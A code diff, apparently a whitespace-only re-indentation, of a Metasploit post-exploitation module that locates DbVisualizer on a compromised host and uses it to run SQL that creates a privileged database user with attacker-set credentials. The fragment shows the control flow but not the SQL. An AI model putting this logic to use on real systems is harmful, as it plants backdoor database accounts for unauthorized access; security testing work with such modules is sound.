@@ -39,19 +39,19 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-   db_type = exist_and_supported()
-   unless db_type.blank?
-     dbvis = find_dbviscmd()
-     unless dbvis.blank?
-       sql = get_sql(db_type)
-       errors = dbvis_query(dbvis,sql)
-       if errors == true
-         print_error("No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ")
-       else
-         print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
-       end
-     end
-   end
+    db_type = exist_and_supported()
+    unless db_type.blank?
+      dbvis = find_dbviscmd()
+      unless dbvis.blank?
+        sql = get_sql(db_type)
+        errors = dbvis_query(dbvis,sql)
+        if errors == true
+          print_error("No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ")
+        else
+          print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
+        end
+      end
+    end
   end
 
   # Check if the alias exist and if database is supported by this script
@@ -177,9 +177,9 @@ class Metasploit3 < Msf::Post
       dbvis_home_dir = nil
       #Browse program content to find a possible dbvis home
       dirs.each do |d|
-         if (d =~ /DbVisualizer[\S+\s+]+/i)
-           dbvis_home_dir=d
-         end
+        if (d =~ /DbVisualizer[\S+\s+]+/i)
+          dbvis_home_dir=d
+        end
       end
       if dbvis_home_dir.blank?
         print_error("Dbvis home not found, maybe uninstalled ?")
